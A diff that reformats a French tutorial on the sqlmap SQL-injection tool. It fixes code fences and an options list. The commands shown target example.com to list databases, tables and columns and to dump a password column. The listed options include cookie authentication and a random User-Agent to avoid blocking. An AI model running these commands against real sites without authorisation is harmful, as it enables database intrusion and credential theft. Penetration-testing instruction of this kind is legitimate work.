@@ -7,7 +7,7 @@ Installation
 ```bash
 sudo apt install sqlmap
 ```
-Passons aux tests :
+lance :
 ```bash
 sqlmap -u "http://example.com/page.php?id=1" --batch --level=3 --risk=2
 ```
@@ -36,26 +36,21 @@ sqlmap -u "http://example.com/page.php?id=1" --batch --dbs
 ```
 Pour lister les tables dans une base mydb :
 
-bash
-Copier
-Modifier
+```bash
 sqlmap -u "http://example.com/page.php?id=1" --batch -D mydb --tables
+```
 Pour lister les colonnes d’une table users :
 
-bash
-Copier
-Modifier
+```bash
 sqlmap -u "http://example.com/page.php?id=1" --batch -D mydb -T users --columns
+```
 Pour extraire les données d’une colonne password :
 
-bash
-Copier
-Modifier
+```bash
 sqlmap -u "http://example.com/page.php?id=1" --batch -D mydb -T users -C password --dump
+```
 4. Autres options utiles
---cookie="PHPSESSID=xyz" si tu as besoin d’authentification via cookie
-
---random-agent pour changer l’User-Agent et éviter certains blocages
-
---timeout=10 pour allonger le délai si le serveur est lent
+* `--cookie="PHPSESSID=xyz"` si tu as besoin d’authentification via cookie
+* `--random-agent` pour changer l’User-Agent et éviter certains blocages
+* `--timeout=10` pour allonger le délai si le serveur est lent
 
